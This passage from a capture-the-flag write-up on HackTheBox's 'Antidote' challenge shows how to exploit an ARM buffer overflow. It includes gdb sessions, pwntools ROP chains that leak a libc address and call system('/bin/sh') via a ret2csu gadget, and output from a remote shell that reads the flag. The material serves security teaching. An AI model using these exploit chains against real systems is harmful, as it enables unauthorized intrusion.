</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb-multiarch</span> -q
<span class="code-red">gef➤  </span>file antidote
Reading symbols from <span class="code-dark-green">antidote</span>...
(No debugging symbols found in <span class="code-dark-green">antidote</span>)
<span class="code-red">gef➤  </span>break *main+92
Breakpoint 1 at <span class="code-dark-blue">0x8540</span>
<span class="code-red">gef➤  </span>target remote localhost:1234
Remote debugging using localhost:1234
warning: remote target does not support file transfer, attempting to access files from local filesystem.  
warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
<span class="code-dark-blue">0xff7bca40</span> in <span class="code-dark-yellow">??</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>continue
Continuing.

Breakpoint 1, <span class="code-dark-blue">0x00008540</span> in <span class="code-dark-yellow">main</span> ()  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/i $pc
=&gt; <span class="code-dark-blue">0x8540</span> &lt;<span class="code-dark-yellow">main</span>+92&gt;:    sub     r3, r11, #220   ; 0xdc  
<span class="code-green">gef➤  </span>p $r11
$1 = 0xfffef85c
</code></pre></div><p>If we update this value in the ROP chain, the program does not crash anymore:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">216</span>
<span class="mtk1">    </span><span class="mtk1">junk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">offset</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk7 mtki">0x</span><span class="mtk6">fffef85c</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_r3_pc</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span>elf<span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.write)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span>elf<span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.main </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">76</span><span class="mtk1">)</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './antidote'
    Arch:     arm-32-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x8000)</span>
[<span class="code-green">+</span>] Starting local process './antidote': pid 1372339  
[<span class="code-blue">*</span>] Leaked write() address: 0xff6e5e28
[<span class="code-green">+</span>] Glibc base address: 0xff619000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span>
</code></pre></div><h3 id="getting-rce">Getting RCE</h3><p>The next thing is to call <code>system("/bin/sh")</code>. For that, we will need that <code>$r0 = "/bin/sh"</code>. The only way we are able to set <code>$r0</code> is by using the long gadget:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">0x000005a4</span>: <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">sub</span> <span class="code-white">r5, sb, #1<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>  
</code></pre></div><p>And to set <code>$sl</code>, <code>$r7</code> and <code>$r8</code> we need to use another long gadget:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">0x00000628</span>: <span class="code-yellow">pop</span> <span class="code-white">{r4, r5, r6, r7, r8, sb, sl, pc}<span class="code-blue">;</span>  
</code></pre></div><p>This is actually a Ret2csu attack, since this gadget is inside <code>__libc_csu_init</code>, but there&rsquo;s nothing fancy about it. So we will set <code>$sl</code> to be the address of <code>"/bin/sh"</code> inside Glibc and set <code>$r3</code> to the address of <code>system</code> inside Glibc. This is the ROP chain:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk7 mtki">0x</span><span class="mtk6">fffef85c</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_r4_r5_r6_r7_r8_sb_sl_pc</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">6</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk8">next</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk8">search</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)))</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_r3_pc</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">mov_r0_sl_mov_r1_r2_mov_r2_r7_blx_r3</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><h2 id="flag">Flag</h2><p>The exploit does not run locally for some reason, but it works remotely (we must use the provided Glibc):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 178.62.107.21:32750
[<span class="code-blue">*</span>] './antidote'
    Arch:     arm-32-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x8000)</span>
[<span class="code-green">+</span>] Opening connection to 178.62.107.21 on port 32750: Done
[<span class="code-blue">*</span>] Leaked write() address: 0xff72bbc5
[<span class="code-green">+</span>] Glibc base address: 0xff69f000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
bin
boot
dev
etc
home
lib
lib32
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
<span class="code-red">$</span> find / -name flag.txt 2&gt;/dev/null | xargs cat
HTB{Th4nk_y0u_f0r_h3lp1ng_m3_w1th_th4t_bug!Y0u_s4ved_my_arm}  
</code></pre></div><p>The full exploit script can be found in here: <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Antidote/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>